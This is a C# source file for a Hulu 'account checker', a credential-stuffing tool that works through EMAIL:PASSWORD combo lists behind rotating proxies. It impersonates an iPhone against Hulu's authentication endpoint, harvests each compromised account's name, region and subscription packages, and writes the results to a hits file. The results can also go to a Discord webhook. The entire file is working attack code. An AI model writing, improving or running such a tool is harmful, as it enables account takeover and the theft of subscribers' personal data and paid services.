using Extreme.Net;
using Fish_Tools.core.Utils;
using Newtonsoft.Json;
using System.Security.Authentication;
using System.Text;
using System.Text.RegularExpressions;
using HttpException = Extreme.Net.HttpException;
using HttpExceptionStatus = Extreme.Net.HttpExceptionStatus;
using HttpProxyClient = Extreme.Net.HttpProxyClient;
using HttpRequest = Extreme.Net.HttpRequest;
using HttpStatusCode = Extreme.Net.HttpStatusCode;
using Socks4ProxyClient = Extreme.Net.Socks4ProxyClient;
using Socks5ProxyClient = Extreme.Net.Socks5ProxyClient;

namespace Fish_Tools.core.MiscTools.AccountChecker.Checkers
{
    // idk if works i dont have a hulu acc
    internal class HuluAccountChecker
    {
        private static readonly string CombosFile = "Combos.txt";
        private const int CooldownTime = 350;
        public static List<string> Proxys = new List<string>();
        public static Random Rand = new Random();
        public static string ProxyUsing = "SOCKS4";
        private static readonly string HitsFile = "Result/HuluHits.txt";
        private static bool UsingDiscord;
        private static string DiscordWebHook;

        public static void Main(Logger logger)
        {
            Console.Clear();
            Console.Title = "Fish Tools";
            logger.PrintArt();

            File.WriteAllText(HitsFile, string.Empty);
            logger.Info($"Place your combo inside \"{CombosFile}\" in format EMAIL:PASSWORD and press enter.");
            Console.ReadKey();

            logger.Info($"If you want hits to be sent to your Discord, insert webhook and press enter. Otherwise, leave blank:");
            string discord = Console.ReadLine();
            UsingDiscord = !string.IsNullOrWhiteSpace(discord);
            DiscordWebHook = discord;

            logger.Info("Proxys Path");
            string proxys = Console.ReadLine();
            Proxys.AddRange(File.ReadAllLines(proxys));

            TestCombos(logger).GetAwaiter().GetResult();
        }
        public static string getProxy()
        {
            return Convert.ToString(Proxys[Rand.Next(0, Proxys.Count)]);
        }
        private static async Task TestCombos(Logger logger)
        {
            if (!File.Exists(CombosFile))
            {
                logger.Error($"No combos detected. Please upload them to \"{CombosFile}\".");
                File.Create(CombosFile).Close();
                return;
            }

            string[] combos = File.ReadAllLines(CombosFile);

            if (combos.Length == 0)
            {
                logger.Error("No combos detected. Please upload them to \"Combos.txt\".");
                return;
            }

            logger.Warn($"Loaded Combos: {combos.Length}");

            if (ConfirmContinue(logger))
            {
                foreach (var combo in combos)
                {
                    var split = combo.Split(':');
                    if (split.Length == 2)
                    {
                        await CheckLogin(split[0], split[1], logger);
                    }

                    await Task.Delay(CooldownTime);
                }
            }
        }
        public static bool ConfirmContinue(Logger logger)
        {
            Console.Clear();
            Console.Title = "Fish Tools";
            logger.PrintArt();
            return true;
        }
        private async static Task CheckLogin(string email, string password, Logger Logger)
        {
            try
            {
                using (HttpRequest httpRequest = new HttpRequest())
                {
                    if (ProxyUsing.Contains("HTTP"))
                    {
                        httpRequest.Proxy = HttpProxyClient.Parse(getProxy());
                    }
                    else if (ProxyUsing.Contains("SOCKS4"))
                    {
                        httpRequest.Proxy = Socks4ProxyClient.Parse(getProxy());
                    }
                    else if (ProxyUsing.Contains("SOCKS5"))
                    {
                        httpRequest.Proxy = Socks5ProxyClient.Parse(getProxy());
                    }

                    string responseText = "";
                    httpRequest.SslProtocols = SslProtocols.Tls12;
                    httpRequest.Cookies = new CookieDictionary(false);
                    string postData = $"affiliate_name=apple&friendly_name=Andy%27s+Iphone&password={password}&product_name=iPhone7%2C2&serial_number=00001e854946e42b1cbf418fe7d2dcd64df0&user_email={email}";
                    string response = httpRequest.Post("https://auth.hulu.com/v1/device/password/authenticate", postData, "application/x-www-form-urlencoded").ToString();
                    if (response.Contains("user_token"))
                    {
                        Directory.CreateDirectory("Result");
                        Match tokenMatch = Regex.Match(response, "user_token\":\"(.*?)\"");
                        httpRequest.AddHeader("Authorization", "Bearer " + tokenMatch.Groups[1].Value);
                        string userDetails = httpRequest.Get("https://home.hulu.com/v1/users/self", null).ToString();
                        if (userDetails.Contains(",\"subscription\":{\"id\":"))
                        {
                            Match nameMatch = Regex.Match(userDetails, "\"name\":\"(.*?)\"");
                            Match birthdateMatch = Regex.Match(userDetails, "birthdate\":\"(.*?)\"");
                            Match regionMatch = Regex.Match(userDetails, "region\":\"(.*?)\"");
                            string packageDetails = "";
                            if (userDetails.Contains("\",\"status\":\"5\",\"subscriber_id\":\"") || userDetails.Contains("package_ids\":[],\""))
                            {
                                string hitInfo = $"{email}:{password} | Username: {nameMatch.Groups[1].Value} | Region: {regionMatch.Groups[1].Value} | Plan: Free";
                                if (UsingDiscord)
                                {
                                    using (var httpClient = new HttpClient())
                                    {
                                        var payload = new
                                        {
                                            content = hitInfo,
                                            embeds = (object)null,
                                            attachments = new object[] { }
                                        };

                                        var content = new System.Net.Http.StringContent(JsonConvert.SerializeObject(payload), Encoding.UTF8, "application/json");
                                        await httpClient.PostAsync(DiscordWebHook, content);
                                    }
                                }
                                File.AppendAllText(HitsFile, hitInfo + Environment.NewLine);
                            }
                            else
                            {
                                Match packageMatch = Regex.Match(userDetails, "\"package_ids\":(.*?),\"cus");
                                string packageIds = packageMatch.Groups[1].Value;
                                if (packageIds.Contains("[\"1\",\"2\"]"))
                                {
                                    packageDetails = "Hulu";
                                }
                                if (packageIds.Contains("\"14\""))
                                {
                                    packageDetails += " | Hulu (No Ads)";
                                }
                                if (packageIds.Contains("\"15\""))
                                {
                                    packageDetails += " | SHOWTIME®";
                                }
                                if (packageIds.Contains("\"16\""))
                                {
                                    packageDetails += " | Live TV";
                                }
                                if (packageIds.Contains("\"17\""))
                                {
                                    packageDetails += " | HBO®";
                                }
                                if (packageIds.Contains("\"18\""))
                                {
                                    packageDetails += " | CINEMAX®";
                                }
                                if (packageIds.Contains("\"19\""))
                                {
                                    packageDetails += " | STARZ®";
                                }
                                if (packageIds.Contains("\"21\""))
                                {
                                    packageDetails += " | Entertainment Add-On";
                                }
                                if (packageIds.Contains("\"23\""))
                                {
                                    packageDetails += " | Español Add-On";
                                }
                                if (packageIds.Contains("\"25\",\"26\""))
                                {
                                    packageDetails += " | Hulu, Disney+, and ESPN+";
                                }
                                if (packageIds.Contains("\"17\",\"27\""))
                                {
                                    packageDetails += " | HBO Max™";
                                }
                                string hitInfo = $"{email}:{password} | Username: {nameMatch.Groups[1].Value} | Region: {regionMatch.Groups[1].Value} | Plan: Premium | Subscription: {packageDetails}";
                                if (UsingDiscord)
                                {
                                    using (var httpClient = new HttpClient())
                                    {
                                        var payload = new
                                        {
                                            content = hitInfo,
                                            embeds = (object)null,
                                            attachments = new object[] { }
                                        };

                                        var content = new System.Net.Http.StringContent(JsonConvert.SerializeObject(payload), Encoding.UTF8, "application/json");
                                        await httpClient.PostAsync(DiscordWebHook, content);
                                    }
                                }
                                File.AppendAllText(HitsFile, hitInfo + Environment.NewLine);
                            }
                        }
                        else
                        {
                            if (userDetails.Contains("\"status\":null,\"subscriber_id\"") || userDetails.Contains("\"status\":\"6\",\"subscriber_id\"")) { }
                        }
                    }
                    else
                    {
                        if (response.Contains("Your login is invalid")) { }
                    }
                }
            }
            catch (HttpException ex)
            {
                if (ex.Status == HttpExceptionStatus.ConnectFailure) { }
                if (ex.HttpStatusCode == HttpStatusCode.Forbidden) { }
                if (ex.HttpStatusCode == HttpStatusCode.NotAcceptable) { }
            }
        }
    }
}
